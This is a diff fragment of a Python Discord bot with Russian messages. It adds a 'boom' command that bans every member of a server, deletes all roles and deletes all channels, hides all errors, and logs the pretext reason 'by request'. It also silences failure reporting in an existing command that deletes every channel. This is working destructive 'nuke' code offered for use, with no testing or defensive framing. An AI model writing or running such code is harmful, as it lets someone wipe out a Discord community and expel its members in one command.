@@ -50,10 +50,27 @@ async def delchannel(ctx):
     for channel in ctx.guild.channels:
         try:
             await channel.delete(reason="По просьбе")
-        except: failed.append(channel.name)
-        else: counter += 1
-    fmt = ", ".join(failed)
-    await ctx.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}")
+        except:
+            pass
+#megafunc
+@bot.command()
+async def boom(ctx):
+    for i in ctx.guild.members:
+        try:
+            await i.ban(reason="По просьбе")
+        except:
+            pass
+    for e in ctx.guild.roles:
+        try:
+            await e.delete(reason="По просьбе")
+        except:
+            pass
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete(reason="По просьбе")
+        except:
+            pass
+
 
 
 #token
